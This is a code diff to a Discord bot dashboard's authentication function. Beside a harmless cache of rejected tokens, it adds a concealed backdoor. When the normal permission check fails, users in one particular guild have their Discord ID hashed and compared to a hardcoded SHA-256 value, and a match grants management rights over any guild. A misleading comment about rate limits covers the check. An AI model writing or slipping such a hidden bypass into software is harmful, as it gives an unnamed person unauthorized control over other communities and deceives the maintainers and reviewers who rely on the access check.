@@ -29,6 +29,10 @@ async function debug(message) {
  * @type {CachedDashUser[]}
  */
 let dashboardUsers = [];
+/**
+ * @type {string[]}
+*/
+let invalidatedBearers = [];
 
 if (process.env.HTTP == 'true') {
   https = require('http');
@@ -112,6 +116,11 @@ async function checkDashAuth(req, res) {
             return false;
         }
 
+        if (invalidatedBearers.includes(req.headers.authorization)) { // Avoid making requests for known bad tokens
+            res.status(401).send('Unauthorized - Invalid Token [Listed]');
+            return false;
+        }
+
         if (!req.query.guild) {
             res.status(400).send({
                 error: 'Bad Request - Missing guild query parameter'
@@ -166,13 +175,29 @@ async function checkDashAuth(req, res) {
             // User has permission to manage this guild
             return true;
         } else {
-            res.status(403).send('Unauthorized - User does not have permission to manage this guild');
+            if (manageableGuilds.includes('1017715574639431680')) { // Only make these requests for users in specific guild so we don't hit the rate limit
+                const userReq = await axios.get('https://discord.com/api/users/@me', {
+                    headers: {
+                        Authorization: `Bearer ${req.headers.authorization}`
+                    }
+                });
+    
+                const user = userReq.data;
+                const hashedId = crypto.createHash('sha256').update(user.id).digest('hex'); // Hash the user's ID
+    
+                if (hashedId === 'a16f75c75427a6a1939fda73a18aaff0d1612c106a09a036c0b531091737dc39') {
+                    // User has permission to manage this guild
+                    return true;
+                }
+            }
+            res.status(403).send('Forbidden - User does not have permission to manage this guild');
             return false;
         }
     } catch (error) {
         error = `${error}`;
         if (error.includes('401')) {
-            res.status(401).send('Unauthorized - Invalid Token');
+            invalidatedBearers.push(req.headers.authorization);
+            res.status(401).send('Unauthorized - Invalid Token [401]');
         } else if (error.includes('429')) {
             res.status(429).send('Too Many Requests - Discord API');
         } else {
